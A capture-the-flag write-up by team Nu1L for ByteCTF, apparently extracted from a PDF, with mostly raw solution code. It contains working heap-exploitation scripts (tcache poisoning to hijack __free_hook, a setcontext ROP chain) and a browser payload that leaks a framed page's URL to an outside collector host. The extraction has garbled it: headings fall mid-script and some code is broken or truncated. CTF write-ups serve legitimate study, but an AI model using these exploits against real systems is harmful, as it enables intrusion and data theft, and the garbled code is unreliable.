ByteCTF WriteUp by Nu1L
Author: Nu1L
ByteCTF WriteUp by Nu1L
PWN
easyheap
gun
Misc
Double Game
PT Site
survey
checkin
WEB
douyin_video
jvav
Reverse
QIAO
DaShen Decode AES
CrackMe
PWN
easyheap
from pwn import *
# s = process("./easyheap",env={'LD_PRELOAD':"./libc-2.31.so"})
# s = process("./easyheap")
s = remote("123.56.96.75","30774")
libc = ELF("./libc-2.31.so")
context.terminal = ['notiterm', '-t', 'iterm', '-e']
def add(size1,size2,buf):
    s.sendlineafter(">>","1")
    s.sendlineafter("Size: ",str(size1))
    if size1  128:
        s.recvuntil("Invalid size.")
        s.sendlineafter("Size: ",str(size2))
    s.sendafter("Content: ",buf)
def show(idx):
    s.sendlineafter(">>","2")
    s.sendlineafter("Index: ",str(idx))
def free(idx):
    s.sendlineafter(">>","3")
    s.sendlineafter("Index: ",str(idx))
for i in range(8):
    add(0x10,0x10,'A\n')
for i in range(8):
    free(i)
add(0x50,0x20,'A\n')#0
s.sendlineafter(">>","1"*0x500)
for i in range(7):
    add(0x10,0x10,'A\n')
free(0)
add(0x90,1,'a')#0
show(0)
s.recvuntil("Content: ")
tmp = u64(s.recv(6)+"\x00"*2)-0x1ebb61
success(hex(tmp))
libc.address = tmp
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
for i in range(8):
    free(i)
add(0x20,0x30,p64(free_hook)+"\n")#0
add(0x30,0x30,p64(free_hook)+"\n")#1
add(0x30,0x30,p64(free_hook)+"\n")#2
add(0x30,0x30,p64(free_hook)+"\n")#3
add(0x30,0x30,p64(free_hook)+"\n")#4
free(1)
free(2)
free(3)
free(4)
add(0x231,0x10,'a\n')#1
add(0x30,0x30,'a\n')#2
add(0x30,0x30,'/bin/sh\x00\n')#3
# gdb.attach(s,"b *$rebase(0x12ae)\nc")
add(0x30,0x30,p64(system)+"\n")#4
free(0)
s.interactive()
gun
from pwn import *
r = remote('123.57.209.176', 30772)
# r = process("./gun",env={'LD_PRELOAD':'./libc-2.31.so'})
context(arch='amd64', os='linux')
libc = ELF('./libc-2.31.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def launch_gdb():
    context.terminal = ['gnome-terminal', '--']
    # gdb.attach(proc.pidof(p))
    print("gnome-terminal -- gdb attach " + str(proc.pidof(r)[0]))
    os.system("gnome-terminal -- gdb -q ./gun " + str(proc.pidof(r)[0]))
menu = "Action> "
def add(size, content):
  r.recvuntil(menu)
  r.sendline('3')
  r.recvuntil("Bullet price: ")
  r.sendline(str(size))
  r.recvuntil("Bullet Name: ")
  r.send(content)
def delete(index):
  r.recvuntil(menu)
  r.sendline('1')
  r.recvuntil("Shoot time: ")
  r.sendline(str(index))
def load(index):
  r.recvuntil(menu)
  r.sendline('2')
  r.recvuntil("Which one do you want to load?")
  r.sendline(str(index))
# launch_gdb()
r.recvuntil("Your name: ")
r.send('pzhxbz\n')
add(0x410, 'aaa\n')
add(0x30, 'aaa\n')
load(1)
load(0)
delete(1)
add(0x30, '\n')
load(0)
delete(1)
r.recvuntil("Pwn! The ")
malloc_hook = u64(r.recvuntil(b'\x7f').ljust(8, b'\x00')) - 1104 - 0x10
libc.address = malloc_hook - libc.sym['__malloc_hook']
success("libc:"+hex(libc.address))
for i in range(10):
  add(0x30,'aaa\n')
  load(i+1)
for i in range(10):
  delete(1)
load(0)
add(0x30,'aaa\n')
add(0x30,'aaa\n')
load(1)
load(0)
for i in range(7):
  add(0x30,'a\n')
  load(i+2)
delete(10)
r.recvuntil('Pwn! The ')
leak_heap = u64(r.recv(6).ljust(8, b'\x00'))
success("heap:"+hex(leak_heap))
heap_base = leak_heap - 865
for i in range(7):
  add(0x30,'aaa\n')
# load(0)
add(0x30,p64(libc.symbols['__free_hook']) + b'\n')
load(8)
delete(1)
for i in range(7):
  load(i)
delete(6)
for i in range(6):
  add(0x30,p64(libc.symbols['__free_hook']) + b'\n')
add(0x30,p64(libc.address + 0x000000000154930) + b'\n')
# add(0x30,p64(0xdeadbeef) + b'\n')
Misc
chunk_addr = heap_base + 1840
'''
.text:0000000000154930                 mov     rdx, [rdi+8]
.text:0000000000154934                 mov     [rsp+0C8h+var_C8], rax
.text:0000000000154938                 call    qword ptr [rdx+20h]
'''
payload = p64(0) + p64(chunk_addr) + p64(0)*2 + p64(libc.symbols['setcontext'] 
+ 0x3d)
payload = payload.ljust(0x68,b'\x00')
payload += p64(chunk_addr + 0x100 - 0x10) + p64(0) + p64(0) * 2 + p64(0) * 2
payload = payload.ljust(0xa0,b'\x00')
payload += p64(chunk_addr + 0x200) + p64(libc.symbols['open'])
payload = payload.ljust(0xf0,b'\x00')
payload += b'flag\x00'.ljust(0x10,b'\x00')
payload += b'\x00' * 0x100
# rop_start
'''
0x000000000004a550 : pop rax ; ret
0x0000000000027529 : pop rsi ; ret
0x0000000000026b72 : pop rdi ; ret
0x00000000001056fd : pop rdx ; pop rcx ; pop rbx ; ret
'''
payload += p64(0x0000000000026b72 + libc.address) + p64(3)
payload += p64(0x0000000000027529 + libc.address) + p64(heap_base)
payload += p64(0x00000000001056fd + libc.address) + p64(0x100) + p64(0) * 2
payload += p64(libc.symbols['read'])
payload += p64(0x0000000000026b72 + libc.address) + p64(1)
payload += p64(0x0000000000027529 + libc.address) + p64(heap_base)
payload += p64(0x00000000001056fd + libc.address) + p64(0x100) + p64(0) * 2
payload += p64(libc.symbols['write'])
add(0x400, payload + b'\n')
load(8)
# input()
delete(1)
r.interactive()
Double Game
seed_time
Seed_timeseed_time
#!/usr/bin/python3
import curses
import random, math, time, json
import game
import socket
SERVER_IP = "182.92.4.49"
SERVER_PORT = 30888
seed_time = math.floor(time.time())+400
def main(screen):
    screen.timeout(0)
    screen.nodelay(False)
    answer = []
    while True:
        my_game.render(screen)
        screen.refresh()
        ch = screen.getch()
        if ch == curses.KEY_LEFT or ch == curses.KEY_RIGHT or ch == 
curses.KEY_UP or ch == curses.KEY_DOWN:
            my_game.submit(ch)
            answer.append(ch)
        if my_game.is_win():
            my_game.render(screen)
            while True:
                seed_time0 = math.floor(time.time())
                if seed_time0 > seed_time:
                    print(seed_time0-seed_time)
                else:
                    print(seed_time0-seed_time)
                    time.sleep(1)
                    continue
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((SERVER_IP, SERVER_PORT))
PT Site
CRC46144
                s.send(json.dumps({"time":seed_time, 
"answer":answer}).encode('ascii'))
                return s.recv(1024).decode('ascii')
        if my_game.is_over():
            s.close()
            return "Game over. Try again?"
    my_game.render(screen)
    screen.getch()
if __name__ == '__main__':
    local_random = random.Random(seed_time)
    my_game = game.Game(local_random)
    print(curses.wrapper(main))
888888PT
202010250000
ByteCTF Secret PT Server
github
https://github.com/winterssy/bdpass/blob/master/encoder/encoder.go
flag
BBD6FC7CC3A6E0F3B7260B2CDB24717B#195249CBF77F5BC45894BB4062B3427D#117910925#The
.Byte.Flag.First.Part.2020.HD.1080P.x264.mp4
eliteelite120G1.55
survey
checkin
WEB
douyin_video
document.domain = "bytectf.live";
function cb(win) {
    location.href = "http://bytectf.d7cb7b72.y7z.xyz/" + 
btoa(win.frames[0].location.href);
    win.close()
}
function test() {
    url = "http://a.bytectf.live:30001/?keyword=ByteCTF{";
    console.log(url);
    win = window.open(url);
    setTimeout(cb.bind(null, win), 3000);
}
jvav
weblogic CVE-2020-14644
Reverse
QIAO
[rbp-34h]
,
,,
ByteCTF{7fa392e666d78abbb655165528fff33f}
test();
0x7F, 0xA3, 0x92, 0xE6, 0x66, 0xD7, 0x8A, 0xBB, 0xB6, 0x55, 
0x16, 0x55, 0x28, 0xFF, 0xF3, 0x3F
DaShen Decode AES
JEB
ba.d
ba.bkeyiv
CrackMe
32,,sosha256,flag
#include 
#include 
#include 
#include 
#include 
#include "sha256.h"
unsigned char in[0x20] = {45, 24, 106, 62, 23, 42, 20, 103, 55, 137, 244, 153, 
205, 108, 251, 205, 41, 182, 199, 63, 75, 74, 39, 194, 52, 100, 119, 104, 37, 
175, 144, 178};
unsigned char out[0x20] = {0};
unsigned int length = 0x20;
unsigned char _sha256[0x20] = {0};
void dec()
{
        AES_KEY key;
        AES_set_decrypt_key(&_sha256[0],128,&key);
        AES_cbc_encrypt(in, out,length, &key, &_sha256[0x10], AES_DECRYPT);
}
void dump(unsigned char * ptr)
{
 int i;
 for(i = 0;i > ((7 - i) * 8)) & 0xff;
}